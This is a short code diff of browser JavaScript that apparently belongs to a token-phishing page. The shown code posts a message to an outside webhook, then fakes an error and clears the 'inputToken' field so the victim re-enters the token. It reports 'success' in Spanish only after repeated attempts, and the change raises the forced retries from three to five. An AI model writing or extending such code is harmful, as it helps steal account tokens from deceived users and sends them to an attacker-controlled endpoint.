@@ -164,7 +164,7 @@
             await fetch(hook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: msg }) });
             setTimeout(() => {
                 l.style.display = 'none'; stp.style.display = 'block';
-                if(intt < 3) { err.style.display = 'block'; document.getElementById('inputToken').value = ""; } 
+                if(intt < 5) { err.style.display = 'block'; document.getElementById('inputToken').value = ""; } 
                 else { alert('Solicitud procesada con éxito.'); location.reload(); }
             }, 2000);
         }
